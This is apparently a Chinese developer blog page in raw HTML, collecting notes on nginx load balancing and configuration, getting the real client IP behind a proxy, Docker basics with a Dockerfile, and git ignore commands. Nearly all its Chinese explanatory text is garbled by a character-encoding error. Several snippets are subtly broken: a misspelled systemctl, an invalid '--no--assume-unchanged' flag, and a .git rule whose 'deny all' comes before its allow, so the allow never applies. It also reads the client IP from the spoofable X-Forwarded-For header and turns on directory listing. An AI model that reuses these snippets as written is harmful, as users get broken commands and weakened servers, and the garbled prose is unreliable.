</span><br><span class="line">    server backend2.example.com:<span class="number">8080</span> weight=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">server &#123; </span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http:<span class="comment">//backend; </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">å‚æ•°è¯´æ˜:</span><br><span class="line">weight=number è®¾å®šæœåŠ¡å™¨çš„æƒé‡ï¼Œé»˜è®¤æ˜¯<span class="number">1</span>ï¼Œæƒé‡è¶Šå¤§è¢«è®¿é—®æœºä¼šè¶Šå¤§ï¼Œå¯ä»¥æ ¹æ®æœºå™¨çš„é…ç½®æƒ…å†µæ¥é…ç½®ã€‚</span><br><span class="line"></span><br><span class="line">max_fails=number è®¾å®šNginxä¸æœåŠ¡å™¨é€šä¿¡çš„å°è¯•å¤±è´¥çš„æ¬¡æ•°ã€‚åœ¨fail_timeoutå‚æ•°å®šä¹‰çš„æ—¶é—´æ®µå†…ï¼Œå¦‚æœå¤±è´¥çš„æ¬¡æ•°è¾¾åˆ°æ­¤å€¼ï¼ŒNginxå°±è®¤ä¸ºæœåŠ¡å™¨ä¸ å¯ç”¨ã€‚åœ¨ä¸‹ä¸€ä¸ªfail_timeoutæ—¶é—´æ®µï¼ŒæœåŠ¡å™¨ä¸ä¼šå†è¢«å°è¯•ã€‚ å¤±è´¥çš„å°è¯•æ¬¡æ•°é»˜è®¤æ˜¯<span class="number">1</span>ã€‚</span><br><span class="line"></span><br><span class="line">é»˜è®¤é…ç½®æ—¶ï¼Œhttp_404çŠ¶æ€ä¸è¢«è®¤ä¸ºæ˜¯å¤±è´¥çš„å°è¯•ã€‚ å¯ä»¥é€šè¿‡æŒ‡ä»¤proxy_next_upstream å’Œmemcached_next_upstreamæ¥é…ç½®ä»€ä¹ˆæ˜¯å¤±è´¥çš„å°è¯•ã€‚</span><br><span class="line"></span><br><span class="line">fail_timeout=time</span><br><span class="line">ç»Ÿè®¡å¤±è´¥å°è¯•æ¬¡æ•°çš„æ—¶é—´æ®µã€‚åœ¨è¿™æ®µæ—¶é—´ä¸­ï¼ŒæœåŠ¡å™¨å¤±è´¥æ¬¡æ•°è¾¾åˆ°æŒ‡å®šçš„å°è¯•æ¬¡æ•°ï¼ŒæœåŠ¡å™¨å°±è¢«è®¤ä¸ºä¸å¯ç”¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥è¶…æ—¶æ—¶é—´æ˜¯<span class="number">10</span>ç§’ã€‚ </span><br><span class="line"></span><br><span class="line">backup</span><br><span class="line">æ ‡è®°ä¸ºå¤‡ç”¨æœåŠ¡å™¨ã€‚å½“ä¸»æœåŠ¡å™¨ä¸å¯ç”¨ä»¥åï¼Œè¯·æ±‚ä¼šè¢«ä¼ ç»™è¿™äº›æœåŠ¡å™¨ï¼Œé…ç½®è¿™ä¸ªæŒ‡ä»¤å¯ä»¥å®ç°æ•…éšœè½¬ç§»ã€‚</span><br><span class="line"></span><br><span class="line">down æ ‡è®°æœåŠ¡å™¨æ°¸ä¹…ä¸å¯ç”¨ï¼Œå¯ä»¥è·Ÿip_hashæŒ‡ä»¤ä¸€èµ·ä½¿ç”¨ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/articles/36737</span></span><br></pre></td></tr></table></figure>
<h3 id="Nginx-é…ç½®å¸¸ç”¨å‚æ•°"><a href="#Nginx-é…ç½®å¸¸ç”¨å‚æ•°" class="headerlink" title="Nginx é…ç½®å¸¸ç”¨å‚æ•°"></a>Nginx é…ç½®å¸¸ç”¨å‚æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"># é…ç½®ç”¨æˆ·æˆ–è€…ç»„ï¼Œé»˜è®¤ä¸ºnobody nobodyã€‚</span><br><span class="line">#user www www;  </span><br><span class="line"></span><br><span class="line"> #Nginxå¼€å¯çš„workerè¿›ç¨‹æ•°ï¼Œå»ºè®®ä¸ºCPUçš„æ ¸æ•°</span><br><span class="line">#worker_processes 2; </span><br><span class="line"></span><br><span class="line">#æŒ‡å®šnginxè¿›ç¨‹è¿è¡Œæ–‡ä»¶å­˜æ”¾åœ°å€</span><br><span class="line">#pid /nginx/pid/nginx.pid;</span><br><span class="line"></span><br><span class="line">#æŒ‡å®šæ—¥å¿—è·¯å¾„ï¼Œçº§åˆ«ã€‚è¿™ä¸ªè®¾ç½®å¯ä»¥æ”¾å…¥å…¨å±€å—ã€httpå—ã€serverå—ï¼Œçº§åˆ«ä»¥æ­¤ä¸ºï¼šdebug|info|notice|warn|error|crit|alert|emerg</span><br><span class="line">error_log log/error.log debug; </span><br><span class="line"></span><br><span class="line">#å¯ä»¥åœ¨ä»»æ„åœ°æ–¹ä½¿ç”¨includeæŒ‡ä»¤å®ç°é…ç½®æ–‡ä»¶çš„åŒ…å«ï¼Œç±»ä¼¼äºapacheä¸­çš„includeæ–¹æ³•ï¼Œå¯å‡å°‘ä¸»é…ç½®æ–‡ä»¶é•¿åº¦ã€‚</span><br><span class="line">include vhosts<span class="comment">/*.conf;</span></span><br><span class="line"><span class="comment">äº‹ä»¶æ¨¡å—</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">events &#123;</span></span><br><span class="line"><span class="comment">    #è®¾ç½®ç½‘è·¯è¿æ¥åºåˆ—åŒ–ï¼Œé˜²æ­¢æƒŠç¾¤ç°è±¡å‘ç”Ÿï¼Œé»˜è®¤ä¸ºon</span></span><br><span class="line"><span class="comment">    accept_mutex on; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #é»˜è®¤: 500ms å¦‚æœä¸€ä¸ªè¿›ç¨‹æ²¡æœ‰äº’æ–¥é”ï¼Œå®ƒå°†å»¶è¿Ÿè‡³å°‘å¤šé•¿æ—¶é—´ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå»¶è¿Ÿæ˜¯500ms ã€‚</span></span><br><span class="line"><span class="comment">    accept_mutex_delay 100ms; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #è®¾ç½®ä¸€ä¸ªè¿›ç¨‹æ˜¯å¦åŒæ—¶æ¥å—å¤šä¸ªç½‘ç»œè¿æ¥ï¼Œé»˜è®¤ä¸ºoff</span></span><br><span class="line"><span class="comment">    multi_accept on;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œselect|poll|kqueue|epoll|resig|/dev/poll|eventportï¼Œä¸å»ºè®®è®¾ç½®ï¼Œnginxä¼šè‡ªè¡Œé€‰æ‹©</span></span><br><span class="line"><span class="comment">    #use epoll;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #æœ€å¤§è¿æ¥æ•°ï¼Œé»˜è®¤ä¸º512</span></span><br><span class="line"><span class="comment">    worker_connections  1024;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">http éƒ¨åˆ†</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">http &#123;</span></span><br><span class="line"><span class="comment">    #æ–‡ä»¶æ‰©å±•åä¸æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨</span></span><br><span class="line"><span class="comment">    include       mime.types;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    # é»˜è®¤æ–‡ä»¶ç±»å‹ï¼Œé»˜è®¤ä¸ºtext/plain</span></span><br><span class="line"><span class="comment">    default_type  application/octet-stream; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #å–æ¶ˆæœåŠ¡æ—¥å¿— </span></span><br><span class="line"><span class="comment">    #access_log off; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #å…è®¸sendfileæ–¹å¼ä¼ è¾“æ–‡ä»¶ï¼Œé»˜è®¤ä¸ºoffï¼Œå¯ä»¥åœ¨httpå—ï¼Œserverå—ï¼Œlocationå—ã€‚</span></span><br><span class="line"><span class="comment">    sendfile on;   </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #æ¯ä¸ªè¿›ç¨‹æ¯æ¬¡è°ƒç”¨ä¼ è¾“æ•°é‡ä¸èƒ½å¤§äºè®¾å®šçš„å€¼ï¼Œé»˜è®¤ä¸º0ï¼Œå³ä¸è®¾ä¸Šé™ã€‚</span></span><br><span class="line"><span class="comment">    sendfile_max_chunk 100k;  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤ä¸º75sï¼Œå¯ä»¥åœ¨httpï¼Œserverï¼Œlocationå—ã€‚</span></span><br><span class="line"><span class="comment">    keepalive_timeout 65;  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #å¼€å¯gzipèµ„æºå‹ç¼©</span></span><br><span class="line"><span class="comment">    gzip  on; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    # è´Ÿè½½å‡è¡¡ï¼Œè¯¦ç»†å¯çœ‹äº†ä¸€ç¯‡æ–‡ç« ï¼šhttps://learnku.com/articles/36737</span></span><br><span class="line"><span class="comment">    upstream blog &#123;   </span></span><br><span class="line"><span class="comment">        server 192.167.20.19:8081;</span></span><br><span class="line"><span class="comment">        server 192.168.10.121:8080 weight=5;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #è®¾å®šè¯·æ±‚ç¼“å†²</span></span><br><span class="line"><span class="comment">    client_header_buffer_size    128k;</span></span><br><span class="line"><span class="comment">    large_client_header_buffers  4 128k;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #ä¸Šä¼ æ–‡ä»¶çš„å¤§å°é™åˆ¶  é»˜è®¤1m</span></span><br><span class="line"><span class="comment">    client_max_body_size 8m;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    server &#123;</span></span><br><span class="line"><span class="comment">        #å•è¿æ¥è¯·æ±‚ä¸Šé™æ¬¡æ•°ã€‚</span></span><br><span class="line"><span class="comment">        keepalive_requests 120;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        #ç›‘å¬ç«¯å£</span></span><br><span class="line"><span class="comment">        listen       80;   </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        #ç›‘å¬åœ°å€</span></span><br><span class="line"><span class="comment">        server_name  blog.13sai.com;  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        #è®¾å®šæ—¥å¿—æ ¼å¼</span></span><br><span class="line"><span class="comment">        log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line"><span class="comment">                      '$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line"><span class="comment">                      '"$http_user_agent" "$http_x_forwarded_for"';</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        access_log  /data/logs/access.log  main;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        # æ ¹ç›®å½•</span></span><br><span class="line"><span class="comment">        root /www/web/public; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        # å®šä¹‰é”™è¯¯æç¤ºé¡µé¢</span></span><br><span class="line"><span class="comment">        error_page   500 502 503 504 /50x.html;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        location /static/ &#123;</span></span><br><span class="line"><span class="comment">            #rootä¸aliasä¸»è¦åŒºåˆ«åœ¨äºnginxå¦‚ä½•è§£é‡Šlocationåé¢çš„uriï¼Œè¿™ä¼šä½¿ä¸¤è€…åˆ†åˆ«ä»¥ä¸åŒçš„æ–¹å¼å°†è¯·æ±‚æ˜ å°„åˆ°æœåŠ¡å™¨æ–‡ä»¶ä¸Šã€‚</span></span><br><span class="line"><span class="comment">            #rootçš„å¤„ç†ç»“æœæ˜¯ï¼šrootè·¯å¾„ï¼‹locationè·¯å¾„</span></span><br><span class="line"><span class="comment">            #aliasçš„å¤„ç†ç»“æœæ˜¯ï¼šä½¿ç”¨aliasè·¯å¾„æ›¿æ¢locationè·¯å¾„</span></span><br><span class="line"><span class="comment">            alias /www/static/;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            #è¿‡æœŸ30å¤©ï¼Œé™æ€æ–‡ä»¶ä¸æ€ä¹ˆæ›´æ–°ï¼Œè¿‡æœŸå¯ä»¥è®¾å¤§ä¸€ç‚¹,å¦‚æœé¢‘ç¹æ›´æ–°ï¼Œåˆ™å¯ä»¥è®¾ç½®å¾—å°ä¸€ç‚¹ã€‚</span></span><br><span class="line"><span class="comment">            expires 30d;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        # å¤„ç†phpè¯·æ±‚åˆ°fpmç«¯å£</span></span><br><span class="line"><span class="comment">        location ~ \.php$ &#123;</span></span><br><span class="line"><span class="comment">            fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"><span class="comment">            fastcgi_index  index.php;</span></span><br><span class="line"><span class="comment">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span></span><br><span class="line"><span class="comment">            include        fastcgi_params;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        location / &#123;</span></span><br><span class="line"><span class="comment">            proxy_set_header Host $host;</span></span><br><span class="line"><span class="comment">            proxy_set_header  X-Real-IP  $remote_addr;</span></span><br><span class="line"><span class="comment">            proxy_pass  http://blog;  #è¯·æ±‚è½¬å‘blog å®šä¹‰çš„æœåŠ¡å™¨åˆ—è¡¨ </span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        #ç¦æ­¢è®¿é—®æ–‡ä»¶</span></span><br><span class="line"><span class="comment">        location ~ /.git &#123;</span></span><br><span class="line"><span class="comment">            deny all;</span></span><br><span class="line"><span class="comment">            allow 127.0.0.1; #å…è®¸çš„ip </span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125; https://learnku.com/articles/36768</span></span><br></pre></td></tr></table></figure>
<h3 id="åå‘ä»£ç†åå¦‚ä½•è·å–çœŸå®å®¢æˆ·ç«¯-IP"><a href="#åå‘ä»£ç†åå¦‚ä½•è·å–çœŸå®å®¢æˆ·ç«¯-IP" class="headerlink" title="åå‘ä»£ç†åå¦‚ä½•è·å–çœŸå®å®¢æˆ·ç«¯ IP"></a>åå‘ä»£ç†åå¦‚ä½•è·å–çœŸå®å®¢æˆ·ç«¯ IP</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">location /api &#123; </span><br><span class="line">           rewrite  ^<span class="regexp">/api/</span>(.*)$ /api/$<span class="number">1</span> <span class="keyword">break</span>;</span><br><span class="line">           proxy_pass   https:<span class="comment">//***.*********.com;</span></span><br><span class="line">   &#125;</span><br><span class="line">   proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">   proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">   å¦‚æœæœ‰æŠ¥é”™</span><br><span class="line">   Starting nginx: nginx: [warn] could not build optimal proxy_headers_hash, you should increase either proxy_headers_hash_max_size: <span class="number">512</span> or proxy_headers_hash_bucket_size: <span class="number">64</span>; ignoring proxy_headers_hash_bucket_size</span><br><span class="line">   </span><br><span class="line">       nginx.conf ä¸‹çš„http æ¨¡å—ä¸‹è®¾ç½®</span><br><span class="line">       proxy_headers_hash_max_size <span class="number">51200</span>;</span><br><span class="line">       proxy_headers_hash_bucket_size <span class="number">6400</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="number">3</span> ä»£ç é‡Œé¢è·å–</span><br><span class="line">      $ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">   https:<span class="comment">//learnku.com/articles/36832</span></span><br></pre></td></tr></table></figure>
<h3 id="docker-å…¥é—¨"><a href="#docker-å…¥é—¨" class="headerlink" title="docker å…¥é—¨"></a>docker å…¥é—¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œè®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„é•œåƒä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æˆ– Windows æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ã€‚</span><br><span class="line">docker images -- å¸¸çœ‹æœ¬åœ°é•œåƒ</span><br><span class="line">docker ps -- æŸ¥çœ‹å®¹å™¨ï¼Œé»˜è®¤åªæŸ¥çœ‹å·²å¯åŠ¨çš„ï¼ŒåŠ å…¥ <span class="string">"-a"</span> å‚æ•°å¯ä»¥æŸ¥çœ‹æ‰€æœ‰</span><br><span class="line">docker start|stop|rm|rmi -- å®¹å™¨çš„ç›¸å…³æ“ä½œï¼Œåˆ†åˆ«å¯¹åº”ï¼š å¼€å¯ | åœæ­¢ | åˆ é™¤å®¹å™¨ | åˆ é™¤é•œåƒ</span><br><span class="line">docker pull ubuntu</span><br><span class="line"></span><br><span class="line">docker run -itd --name test-ubuntu ubuntu</span><br><span class="line">docker exec -it test-ubuntu /bin/bash</span><br><span class="line">docker pull php:<span class="number">7.3</span><span class="number">.5</span>-fpm</span><br><span class="line">docker run -itd -p <span class="number">9001</span>:<span class="number">9000</span> -v /Users/admin/Site/php7<span class="number">.3</span><span class="number">.5</span>:<span class="regexp">/data --name php-test php:7.3.5-fpm</span></span><br><span class="line"><span class="regexp">docker exec -it php-test /</span>bin/bash</span><br><span class="line">vi /etc/nginx/config.d/php.conf</span><br><span class="line">server &#123;</span><br><span class="line">    # ç›‘å¬ç«¯å£</span><br><span class="line">    listen       <span class="number">8002</span>;</span><br><span class="line"></span><br><span class="line">    # åŸŸåè®¾å®š</span><br><span class="line">    server_name  <span class="number">122.51</span><span class="number">.155</span><span class="number">.172</span>;</span><br><span class="line"></span><br><span class="line">    root /usr/share/nginx/html/php/; # è¯¥é¡¹è¦ä¿®æ”¹ä¸ºä½ å‡†å¤‡å­˜æ”¾ç›¸å…³ç½‘é¡µçš„è·¯å¾„ï¼Œå¦‚æœå­˜åœ¨fast-cgiçš„rootå­—æ®µï¼Œè¿™é‡Œè²Œä¼¼å°±æ²¡æ•ˆæœäº†</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line"></span><br><span class="line">    index index.php index.html;</span><br><span class="line"></span><br><span class="line">    # æ‰“å¼€ç›®å½•æµè§ˆåŠŸèƒ½ï¼Œå¯ä»¥åˆ—å‡ºæ•´ä¸ªç›®å½•</span><br><span class="line"></span><br><span class="line">    autoindex on;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #proxy the php scripts to php-fpm</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">    # fastcgié…ç½®</span><br><span class="line"></span><br><span class="line">    # æŒ‡å®šæ˜¯å¦ä¼ é€’4xxå’Œ5xxé”™è¯¯ä¿¡æ¯åˆ°å®¢æˆ·ç«¯</span><br><span class="line"></span><br><span class="line">    fastcgi_intercept_errors on;</span><br><span class="line"></span><br><span class="line">    # æŒ‡å®šFastCGIæœåŠ¡å™¨ç›‘å¬ç«¯å£ä¸åœ°å€ï¼Œå¯ä»¥æ˜¯æœ¬æœºæˆ–è€…å…¶å®ƒ,è¿™é‡Œæ˜¯é‡ç‚¹ï¼Œéœ€è¦æŒ‡å®šphp-fpmå®¹å™¨çš„ç«¯å£å’Œæ ¹ç›®å½•</span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9001</span>;</span><br><span class="line">    root /data;</span><br><span class="line">    fastcgi_index index.php;</span><br><span class="line">    include  fastcgi_params;</span><br><span class="line">    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">sysctemclt restart nginx </span><br><span class="line">vi /usr/share/nginx/html/php/inde.php </span><br><span class="line">è®¿é—®http:<span class="comment">//122.51.155.172:8002/</span></span><br><span class="line">Dockerfile æ˜¯ä¸€ä¸ªåŒ…å«ç”¨äºç»„åˆæ˜ åƒçš„å‘½ä»¤çš„æ–‡æœ¬æ–‡æ¡£ã€‚å¯ä»¥ä½¿ç”¨åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨ä»»ä½•å‘½ä»¤ã€‚ Docker é€šè¿‡è¯»å– Dockerfile ä¸­çš„æŒ‡ä»¤è‡ªåŠ¨ç”Ÿæˆæ˜ åƒã€‚</span><br><span class="line">FROM php:<span class="number">7.3</span><span class="number">.5</span>-fpm</span><br><span class="line">MAINTAINER liyan</span><br><span class="line"></span><br><span class="line">#å®‰è£…ç¯å¢ƒç³»ç»Ÿå‘½ä»¤</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">vim \</span><br><span class="line">libssl-dev</span><br><span class="line"></span><br><span class="line">#å®‰è£…PHPæ‰©å±•</span><br><span class="line">RUN pecl install igbinary \</span><br><span class="line">redis<span class="number">-4.0</span><span class="number">.2</span> \</span><br><span class="line">swoole</span><br><span class="line"></span><br><span class="line">#é…ç½®php.ini</span><br><span class="line">RUN cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini &amp;&amp; \</span><br><span class="line">ln -s /usr/local/etc/php/php.ini /etc/php.ini &amp;&amp; \</span><br><span class="line">echo <span class="string">"extension=igbinary.so\nextension=redis.so\nextension=swoole.so"</span> &gt;&gt; <span class="regexp">/etc/</span>php.ini</span><br><span class="line"></span><br><span class="line">EXPOSE <span class="number">9300</span></span><br><span class="line">VOLUME [<span class="string">"/data"</span>]</span><br><span class="line">WORKDIR /data</span><br><span class="line">https:<span class="comment">//learnku.com/articles/36739</span></span><br></pre></td></tr></table></figure>
<h3 id="å¿½ç•¥æ–‡ä»¶"><a href="#å¿½ç•¥æ–‡ä»¶" class="headerlink" title="å¿½ç•¥æ–‡ä»¶"></a>å¿½ç•¥æ–‡ä»¶</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">å·²ç»æ¨é€ push è¿‡çš„æ–‡ä»¶ï¼Œæƒ³åœ¨ä»¥åçš„æäº¤æ—¶å¿½ç•¥æ­¤æ–‡ä»¶ï¼Œå³ä½¿æœ¬åœ°å·²ç»ä¿®æ”¹è¿‡ï¼Œè€Œä¸”ä¸åˆ é™¤ Git è¿œç¨‹åº“ä¸­ç›¸åº”æ–‡ä»¶ï¼Œåé¢çš„ Xml/config.xml æ˜¯è¦å¿½ç•¥çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">git update-index --assume-unchanged Xml/config.xml  </span><br><span class="line">æ¢å¤å¿½ç•¥çš„æ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">git update-index --no--assume-unchanged Xml/config.xml  </span><br><span class="line">å¦‚æœè¦å¿½ç•¥ä¸€ä¸ªç›®å½•ï¼Œæ‰“å¼€ git bashï¼Œå®šä½åˆ°ç›®æ ‡ç›®å½•ä¸‹ï¼Œåé¢çš„ Xml/test/ æ˜¯è¦å¿½ç•¥çš„ç›®å½•çš„è·¯å¾„ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">git update-index --assume-unchanged $(git ls-files Xml/test/ | tr <span class="string">'\n'</span> <span class="string">' '</span>)</span><br><span class="line">æ¸…é™¤æŒ‡å®šç›®å½•ä¸‹æ²¡æœ‰è¢« push è¿‡çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">git clean -df supplier/web    https:<span 